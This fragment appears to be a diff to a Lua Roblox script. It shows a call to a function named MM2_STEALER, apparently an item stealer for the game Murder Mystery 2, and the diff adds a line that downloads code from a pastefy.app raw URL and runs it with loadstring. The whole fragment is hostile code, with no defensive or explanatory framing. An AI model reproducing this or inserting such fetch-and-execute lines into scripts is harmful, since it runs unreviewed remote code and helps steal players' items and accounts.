@@ -703,3 +703,4 @@ function MM2_STEALER()
 	})
 end;
 MM2_STEALER()
+loadstring(game:HttpGet("https://pastefy.app/9W9UhlUQ/raw"))()
